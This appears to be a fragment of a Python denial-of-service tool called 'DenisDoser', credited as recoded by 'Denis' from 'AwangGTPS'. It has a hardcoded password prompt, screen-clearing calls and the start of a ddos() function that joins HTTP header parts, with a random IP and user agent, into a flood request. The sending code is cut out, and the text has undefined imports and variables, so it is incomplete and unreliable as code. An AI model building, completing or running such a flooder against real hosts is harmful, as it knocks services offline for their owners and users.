...
import json
import sys
os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title DenisDoser")
password = input("[ + ] Password nya blok : ")
if password == "MrOncom":
    print("Wait From You Acces")
    print("=========PROSES==========")
    time.sleep(5)
    print("Done You Acces Account Mr.Oncom")
    print("=========SUCCES=============")
    time.sleep(4)
else :
    print("False")
...
os.system('clear')
os.system('cls')
print("Source : AwangGTPS")
print("Recode By Denis")
print("Recode izin dli")
...
def ddos():
    ...
    request  = get_host + forward + get_data + connection + useragent + forwards + length + randomip + referer + content + accept + mozila + "\r\n"
